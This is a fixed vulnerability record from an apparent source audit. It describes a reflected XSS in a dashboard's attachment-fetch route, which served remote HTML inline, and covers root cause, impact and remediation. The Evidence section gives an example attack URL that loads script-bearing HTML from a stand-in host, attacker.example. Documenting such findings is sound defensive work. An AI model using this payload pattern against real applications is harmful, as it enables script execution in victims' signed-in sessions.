---
id: VULN-0009
title: Reflected XSS through /api/attachments/fetch serving remote HTML inline
status: fixed
severity: high
cwe: CWE-79
stride: Tampering
cvss: "7.4"
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
location: dashboard/apps/web/src/app/api/attachments/fetch/route.ts:43
component: attachments
reachability: AUTHENTICATED
exploitability: EASY
confidence: 90
discovered: 2026-09-28
last_seen: 2026-09-28
fixed: 2026-09-28
fix_commit: null
---

## Summary
A GET to the attachment fetch route downloads any public URL and returned it with the remote content type, inline, on the Polaris origin. A signed-in victim who follows a link renders attacker HTML with their session.

## Root cause / data flow
The route copied the upstream content-type and set no Content-Disposition or CSP; SameSite=Lax cookies are sent on the top-level navigation.

## Evidence
White-box source trace; not exercised against a running instance.

Victim opens https://POLARIS/api/attachments/fetch?url=https%3A%2F%2Fattacker.example%2Fx.html where x.html is text/html with <script>.

## Impact
Script execution as any signed-in user who clicks a link.

## Remediation
The response is content-disposition: attachment with `default-src 'none'; sandbox`; the only client reads the bytes with fetch().

## History
- 2026-09-28: discovered by Helio (source audit), status open.
- 2026-09-28: fixed in dashboard/apps/web/src/app/api/attachments/fetch/route.ts; test test/attachments/fetch-route.test.ts.
